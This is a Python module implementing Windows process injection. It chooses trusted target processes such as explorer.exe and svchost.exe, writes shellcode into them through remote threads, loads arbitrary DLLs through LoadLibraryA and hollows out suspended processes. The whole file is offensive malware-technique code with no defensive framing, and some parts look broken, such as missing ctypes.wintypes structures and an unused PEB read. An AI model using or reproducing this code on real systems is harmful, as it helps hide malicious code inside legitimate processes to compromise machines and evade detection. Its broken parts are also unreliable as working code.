"""
Process injection techniques for Windows
"""

import os
import sys
import ctypes
import ctypes.wintypes
import struct
from typing import Optional, List

class ProcessInjection:
    """Various process injection techniques"""
    
    def __init__(self):
        if sys.platform != 'win32':
            raise OSError("Process injection is only supported on Windows")
        
        # Windows API constants
        self.PROCESS_ALL_ACCESS = 0x001F0FFF
        self.MEM_COMMIT = 0x1000
        self.MEM_RESERVE = 0x2000
        self.PAGE_EXECUTE_READWRITE = 0x40
        self.VIRTUAL_MEM = self.MEM_COMMIT | self.MEM_RESERVE
        
        # Load required libraries
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        
    def get_process_list(self) -> List[tuple]:
        """Get list of running processes"""
        processes = []
        
        # Define PROCESSENTRY32 structure
        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ('dwSize', ctypes.wintypes.DWORD),
                ('cntUsage', ctypes.wintypes.DWORD),
                ('th32ProcessID', ctypes.wintypes.DWORD),
                ('th32DefaultHeapID', ctypes.POINTER(ctypes.wintypes.ULONG)),
                ('th32ModuleID', ctypes.wintypes.DWORD),
                ('cntThreads', ctypes.wintypes.DWORD),
                ('th32ParentProcessID', ctypes.wintypes.DWORD),
                ('pcPriClassBase', ctypes.wintypes.LONG),
                ('dwFlags', ctypes.wintypes.DWORD),
                ('szExeFile', ctypes.c_char * 260)
            ]
        
        # Create snapshot
        h_snapshot = self.kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
        if h_snapshot == -1:
            return processes
        
        # Enumerate processes
        pe32 = PROCESSENTRY32()
        pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
        
        if self.kernel32.Process32First(h_snapshot, ctypes.byref(pe32)):
            while True:
                processes.append((
                    pe32.th32ProcessID,
                    pe32.szExeFile.decode('utf-8', errors='ignore')
                ))
                if not self.kernel32.Process32Next(h_snapshot, ctypes.byref(pe32)):
                    break
        
        self.kernel32.CloseHandle(h_snapshot)
        return processes
    
    def find_suitable_process(self, preferred_names: List[str] = None) -> Optional[int]:
        """Find a suitable process for injection"""
        if not preferred_names:
            preferred_names = ['explorer.exe', 'svchost.exe', 'notepad.exe', 'chrome.exe']
        
        processes = self.get_process_list()
        
        for pid, name in processes:
            for preferred in preferred_names:
                if preferred.lower() in name.lower():
                    # Try to open process to verify access
                    h_process = self.kernel32.OpenProcess(self.PROCESS_ALL_ACCESS, False, pid)
                    if h_process:
                        self.kernel32.CloseHandle(h_process)
                        return pid
        
        return None
    
    def classic_injection(self, pid: int, shellcode: bytes) -> bool:
        """Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread injection"""
        try:
            # Open target process
            h_process = self.kernel32.OpenProcess(self.PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                return False
            
            # Allocate memory in target process
            addr = self.kernel32.VirtualAllocEx(
                h_process,
                None,
                len(shellcode),
                self.VIRTUAL_MEM,
                self.PAGE_EXECUTE_READWRITE
            )
            
            if not addr:
                self.kernel32.CloseHandle(h_process)
                return False
            
            # Write shellcode to allocated memory
            written = ctypes.c_size_t(0)
            if not self.kernel32.WriteProcessMemory(
                h_process,
                addr,
                shellcode,
                len(shellcode),
                ctypes.byref(written)
            ):
                self.kernel32.CloseHandle(h_process)
                return False
            
            # Create remote thread
            thread_id = ctypes.wintypes.DWORD(0)
            h_thread = self.kernel32.CreateRemoteThread(
                h_process,
                None,
                0,
                addr,
                None,
                0,
                ctypes.byref(thread_id)
            )
            
            if h_thread:
                self.kernel32.CloseHandle(h_thread)
            
            self.kernel32.CloseHandle(h_process)
            return bool(h_thread)
            
        except Exception:
            return False
    
    def dll_injection(self, pid: int, dll_path: str) -> bool:
        """DLL injection using SetWindowsHookEx or CreateRemoteThread"""
        try:
            # Convert DLL path to bytes
            dll_path_bytes = dll_path.encode('utf-8') + b'\x00'
            
            # Open target process
            h_process = self.kernel32.OpenProcess(self.PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                return False
            
            # Get LoadLibraryA address
            h_kernel32 = self.kernel32.GetModuleHandleW('kernel32.dll')
            load_library_addr = self.kernel32.GetProcAddress(h_kernel32, b'LoadLibraryA')
            
            # Allocate memory for DLL path
            addr = self.kernel32.VirtualAllocEx(
                h_process,
                None,
                len(dll_path_bytes),
                self.VIRTUAL_MEM,
                self.PAGE_EXECUTE_READWRITE
            )
            
            if not addr:
                self.kernel32.CloseHandle(h_process)
                return False
            
            # Write DLL path to memory
            written = ctypes.c_size_t(0)
            if not self.kernel32.WriteProcessMemory(
                h_process,
                addr,
                dll_path_bytes,
                len(dll_path_bytes),
                ctypes.byref(written)
            ):
                self.kernel32.CloseHandle(h_process)
                return False
            
            # Create remote thread to call LoadLibrary
            thread_id = ctypes.wintypes.DWORD(0)
            h_thread = self.kernel32.CreateRemoteThread(
                h_process,
                None,
                0,
                load_library_addr,
                addr,
                0,
                ctypes.byref(thread_id)
            )
            
            if h_thread:
                self.kernel32.WaitForSingleObject(h_thread, 5000)  # Wait 5 seconds
                self.kernel32.CloseHandle(h_thread)
            
            self.kernel32.CloseHandle(h_process)
            return bool(h_thread)
            
        except Exception:
            return False
    
    def process_hollowing(self, target_exe: str, shellcode: bytes) -> bool:
        """Process hollowing technique"""
        try:
            # Create suspended process
            startup_info = ctypes.wintypes.STARTUPINFOW()
            process_info = ctypes.wintypes.PROCESS_INFORMATION()
            
            startup_info.cb = ctypes.sizeof(startup_info)
            
            if not self.kernel32.CreateProcessW(
                target_exe,
                None,
                None,
                None,
                False,
                0x00000004,  # CREATE_SUSPENDED
                None,
                None,
                ctypes.byref(startup_info),
                ctypes.byref(process_info)
            ):
                return False
            
            # Get thread context
            context = ctypes.create_string_buffer(716)  # CONTEXT structure size
            context[0:4] = struct.pack('<I', 0x10007)  # CONTEXT_FULL
            
            if not self.kernel32.GetThreadContext(process_info.hThread, context):
                self.kernel32.TerminateProcess(process_info.hProcess, 0)
                return False
            
            # Read PEB address
            peb_offset = struct.unpack('<Q', context[136:144])[0]  # RDX register on x64
            
            # Allocate memory and write shellcode
            addr = self.kernel32.VirtualAllocEx(
                process_info.hProcess,
                None,
                len(shellcode),
                self.VIRTUAL_MEM,
                self.PAGE_EXECUTE_READWRITE
            )
            
            if not addr:
                self.kernel32.TerminateProcess(process_info.hProcess, 0)
                return False
            
            written = ctypes.c_size_t(0)
            if not self.kernel32.WriteProcessMemory(
                process_info.hProcess,
                addr,
                shellcode,
                len(shellcode),
                ctypes.byref(written)
            ):
                self.kernel32.TerminateProcess(process_info.hProcess, 0)
                return False
            
            # Update entry point in context
            context[128:136] = struct.pack('<Q', addr)  # RCX register on x64
            
            # Set thread context and resume
            if not self.kernel32.SetThreadContext(process_info.hThread, context):
                self.kernel32.TerminateProcess(process_info.hProcess, 0)
                return False
            
            self.kernel32.ResumeThread(process_info.hThread)
            
            # Clean up handles
            self.kernel32.CloseHandle(process_info.hThread)
            self.kernel32.CloseHandle(process_info.hProcess)
            
            return True
            
        except Exception:
            return False
